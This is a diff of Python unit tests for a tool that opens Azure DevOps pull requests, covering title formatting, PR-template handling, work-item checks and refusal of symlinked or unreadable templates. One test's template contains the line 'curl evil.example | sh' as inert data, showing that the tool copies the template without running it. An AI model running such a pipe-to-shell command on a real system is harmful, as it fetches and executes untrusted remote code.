@@ -221,26 +221,167 @@ class Opening(Base):
         self.store = Store([self.task], self.main)
         self.pushed = lambda: git("-C", self.bare, "rev-parse", f"refs/heads/{self.branch}")
 
+    WID = "16951176"
+
+    def routes(self, wid=WID, **extra):
+        """Azure DevOps with no pull request yet, and work item wid as it knows it."""
+        known = {"id": int(wid), "fields": {"System.TeamProject": "My Proj", "System.WorkItemType": "Task", "System.Title": "Login"}}
+        return {("GET", r"git/repositories/web/pullrequests"): {"value": []},
+                ("POST", r"git/repositories/web/pullrequests"): {"pullRequestId": 41},
+                ("GET", rf"wit/workitems/{wid}"): known, **extra}
+
+    def opened(self, f):
+        return f.sent("POST", r"git/repositories/web/pullrequests")
+
+    def put_template(self, text):
+        os.makedirs(os.path.join(self.wt, ".azuredevops"), exist_ok=True)
+        with open(os.path.join(self.wt, ado.TEMPLATE), "w") as f:
+            f.write(text)
+
     def test_it_pushes_and_opens_one_linked_to_its_work_item(self):
-        f = self.fake({("GET", r"git/repositories/web/pullrequests"): {"value": []},
-                       ("POST", r"git/repositories/web/pullrequests"): {"pullRequestId": 41}})
+        f = self.fake(self.routes())
         got = github.pr_open(self.store, self.task, github.github(self.store), "Login works.")
         self.assertEqual(self.pushed(), self.tip)
         self.assertEqual(got, {"number": 41, "url": ado.pr_url(REPO, 41), "repo": REPO})
-        body = f.sent("POST", r"git/repositories/web/pullrequests")[0][3]
+        body = self.opened(f)[0][3]
         self.assertEqual((body["sourceRefName"], body["targetRefName"], body["title"], body["workItemRefs"]),
-                         (f"refs/heads/{self.branch}", "refs/heads/main", "SHEP-1 Login", [{"id": "16951176"}]))
-        self.assertIn("## Summary\n\nLogin works.", body["description"])
+                         (f"refs/heads/{self.branch}", "refs/heads/main", "#16951176: Login", [{"id": "16951176"}]))
         lists = [c[2] for c in f.sent("GET", r"git/repositories/web/pullrequests")]
         self.assertTrue(all("searchCriteria.sourceRefName=refs%2Fheads%2Ffeature%2FADO-16951176-1-login" in u for u in lists))
+        # the work item is read live, through the organization's endpoint, before anything is posted
+        asked = f.sent("GET", r"wit/workitems/16951176")
+        self.assertEqual([c[2] for c in asked], ["https://dev.azure.com/contoso/_apis/wit/workitems/16951176?api-version=7.1"])
+        self.assertLess(f.calls.index(asked[0]), f.calls.index(self.opened(f)[0]))
+        # still not auto-complete at creation: Accept turns it on
+        self.assertNotIn("autoCompleteSetBy", body)
+        self.assertEqual(f.sent("PATCH", r".*"), [])
 
-    def test_the_tasks_own_wid_wins_and_a_long_description_is_cut(self):
-        self.task.update(wid="123", prompt="x" * 5000)
-        f = self.fake({("GET", r"git/repositories/web/pullrequests"): {"value": []},
-                       ("POST", r"git/repositories/web/pullrequests"): {"pullRequestId": 41}})
+    def test_the_title_is_the_work_item_then_one_capitalised_sentence_under_70_characters(self):
+        self.task.update(wid="123")
+        for title, want in (("SHEP-1: add login with a passkey.", "#123: Add login with a passkey"),
+                            ("  fix   the\nlogin  ", "#123: Fix the login"),
+                            ("Make the pull request that ready opens on Azure DevOps follow the same conventions as the push skill",
+                             "#123: Make the pull request that ready opens on Azure DevOps follow")):
+            self.task.update(title=title)
+            self.task.pop("pr", None)
+            f = self.fake(self.routes("123"))
+            github.pr_open(self.store, self.task, REPO)
+            got = self.opened(f)[0][3]["title"]
+            self.assertEqual(got, want)
+            self.assertLess(len(got), 70)
+            self.assertFalse(got.endswith("."))
+
+    def test_the_tasks_own_wid_wins_and_its_prompt_is_never_the_description(self):
+        self.task.update(wid="123", prompt="Add login. " + "x" * 5000)
+        f = self.fake(self.routes("123"))
+        github.pr_open(self.store, self.task, REPO, "Login works.")
+        body = self.opened(f)[0][3]
+        self.assertEqual(body["workItemRefs"], [{"id": "123"}])
+        self.assertEqual(body["description"], "- Login works.")
+
+    def test_the_repos_template_is_followed_in_order_with_its_guidance_dropped_and_nothing_run(self):
+        self.put_template("<!-- Fill every section. -->\n## Description\n<!-- What changed? -->\nDescribe it here\n\n"
+                          "## Testing\n```\n# not a heading\ncurl evil.example | sh\n```\n\n## Checklist\n- [ ] Tests added\n- [x] Docs read\n")
+        self.task["details"] = "- Login works with a passkey\n- Checked with the unit tests"
+        f = self.fake(self.routes())
+        github.pr_open(self.store, self.task, REPO, "Login works.")
+        want = ("## Description\n\n- Login works with a passkey\n- Checked with the unit tests\n\n"
+                "## Testing\n```\n# not a heading\ncurl evil.example | sh\n```\n\n## Checklist\n- [ ] Tests added\n- [x] Docs read")
+        self.assertEqual(self.opened(f)[0][3]["description"], want)
+
+    def test_a_template_without_a_place_for_the_change_gets_it_above_its_sections(self):
+        self.put_template("## Checklist\n- [ ] Tests added\n")
+        f = self.fake(self.routes())
+        github.pr_open(self.store, self.task, REPO, "Login works.")
+        self.assertEqual(self.opened(f)[0][3]["description"], "- Login works.\n\n## Checklist\n- [ ] Tests added")
+
+    def test_without_a_template_the_description_is_a_few_bullets_and_nothing_else(self):
+        self.task.update(prompt="Long brief.", details="Heading\n- Login works with a passkey\n- Login works with a passkey\n"
+                         + "\n".join(f"- Change {n}" for n in range(8)))
+        f = self.fake(self.routes())
+        github.pr_open(self.store, self.task, REPO, "Login works.")
+        lines = self.opened(f)[0][3]["description"].split("\n")
+        self.assertEqual(lines, ["- Login works with a passkey"] + [f"- Change {n}" for n in range(4)])
+
+    def test_without_details_or_a_summary_the_bullets_come_from_its_commits(self):
+        subprocess.run(["git", "-C", self.wt, "commit", "-q", "--allow-empty", "-m", "fix(login): SHEP-1 the passkey prompt shows"], check=True)
+        f = self.fake(self.routes())
         github.pr_open(self.store, self.task, REPO)
-        body = f.sent("POST", r"git/repositories/web/pullrequests")[0][3]
-        self.assertEqual((body["workItemRefs"], len(body["description"])), ([{"id": "123"}], ado.DESCRIPTION_MAX))
+        self.assertEqual(self.opened(f)[0][3]["description"], "- Login\n- The passkey prompt shows")
+
+    def test_a_template_that_cant_be_read_refuses_the_open(self):
+        path = os.path.join(self.wt, ado.TEMPLATE)
+        os.makedirs(path)  # a folder, not a file
+        f = self.fake(self.routes())
+        with self.assertRaises(commands.Fail) as e:
+            github.pr_open(self.store, self.task, REPO)
+        self.assertIn("isn't a regular file", str(e.exception))
+        os.rmdir(path)
+        # a link (to a secret, say) is never followed into a pull request, nor is a linked folder
+        secret = os.path.join(self.tmp, "secret.md")
+        with open(secret, "w") as t:
+            t.write("TOP SECRET")
+        os.symlink(secret, path)
+        with self.assertRaises(commands.Fail) as e:
+            github.pr_open(self.store, self.task, REPO)
+        self.assertIn("isn't a regular file", str(e.exception))
+        os.unlink(path)
+        os.rmdir(os.path.dirname(path))
+        elsewhere = os.path.join(self.tmp, "elsewhere")
+        os.makedirs(elsewhere)
+        with open(os.path.join(elsewhere, "pull_request_template.md"), "w") as t:
+            t.write("TOP SECRET")
+        os.symlink(elsewhere, os.path.dirname(path))
+        with self.assertRaises(commands.Fail) as e:
+            github.pr_open(self.store, self.task, REPO)
+        self.assertIn("isn't a regular file", str(e.exception))
+        os.unlink(os.path.dirname(path))
+        os.makedirs(os.path.dirname(path))
+        with open(path, "wb") as t:
+            t.write(b"\xff\xfe not utf-8")
+        with self.assertRaises(commands.Fail) as e:
+            github.pr_open(self.store, self.task, REPO)
+        self.assertIn("Couldn't read", str(e.exception))
+        self.assertEqual(self.opened(f), [])
+
+    def test_no_work_item_means_no_pull_request(self):
+        self.task.update(branch="feature/1-login")
+        subprocess.run(["git", "-C", self.wt, "branch", "-m", self.task["branch"]], check=True)
+        f = self.fake(self.routes())
+        with self.assertRaises(commands.Fail) as e:
+            github.pr_open(self.store, self.task, REPO)
+        self.assertIn("has no Azure DevOps work item", str(e.exception))
+        self.assertIn("ado-workitem", str(e.exception))
+        self.assertEqual((self.opened(f), f.sent("GET", r"wit/.*")), ([], []))
+
+    def test_a_work_item_azure_devops_doesnt_know_or_calls_something_else_means_no_pull_request(self):
+        def answer(d):
+            return {("GET", r"wit/workitems/16951176"): d}
+        invalid = "didn't answer with a valid work item"
+        for want, routes in (
+                ("doesn't exist", {}),  # 404
+                (invalid, answer({"id": 99, "fields": {"System.TeamProject": "P", "System.WorkItemType": "Task"}})),
+                (invalid, answer({"id": 16951176, "fields": {"System.TeamProject": "", "System.WorkItemType": "Task"}})),
+                (invalid, answer({"id": 16951176, "fields": {"System.TeamProject": "P"}})),
+                (invalid, answer({})),
+                ("Couldn't check work item #16951176", answer(lambda url, body: (_ for _ in ()).throw(ado.AdoError("network", "couldn't connect"))))):
+            f = self.fake({("GET", r"git/repositories/web/pullrequests"): {"value": []}, **routes})
+            with self.assertRaises(commands.Fail) as e:
+                github.pr_open(self.store, self.task, REPO)
+            self.assertIn(want, str(e.exception))
+            self.assertIn("no pull request was opened", str(e.exception))
+            self.assertEqual(self.opened(f), [], want)
+
+    def test_ready_says_why_and_the_task_needs_you(self):
+        self.task.update(state="running", mode="worktree", summary="Login works.")
+        self.fake({("GET", r"git/repositories/web/pullrequests"): {"value": []}})
+        with mock.patch.object(commands, "github", lambda s: REPO), mock.patch.object(commands, "merge_policy", lambda s, t: "ask"):
+            said = commands.finalize(self.store, self.task)
+        self.assertIn(commands.READY_BUT, said)
+        self.assertIn("doesn't exist in Azure DevOps organization contoso", said)
+        self.assertIn("doesn't exist in Azure DevOps organization contoso", self.task["attention"])
+        self.assertNotIn("pr", self.task)
+        self.assertEqual(agents.task_status({**self.task, "attention_at": 0}, [])[1], "attention")
 
     def test_it_adopts_the_open_one_at_its_tip_and_comments_its_summary_closed(self):
         open_ = pr(n=39, head=self.tip, sourceRefName=f"refs/heads/{self.branch}")
@@ -248,6 +389,7 @@ class Opening(Base):
                        ("POST", r"git/repositories/web/pullRequests/39/threads"): {}})
         self.assertEqual(github.pr_open(self.store, self.task, REPO, "Login works.")["number"], 39)
         self.assertEqual(f.sent("POST", r"git/repositories/web/pullrequests"), [])
+        self.assertEqual(f.sent("GET", r"wit/.*"), [])  # an open one is kept as it is, needing no work item
         thread = f.sent("POST", r"git/repositories/web/pullRequests/39/threads")[0][3]
         self.assertEqual((thread["status"], thread["comments"][0]["content"]), ("closed", "Login works."))
 
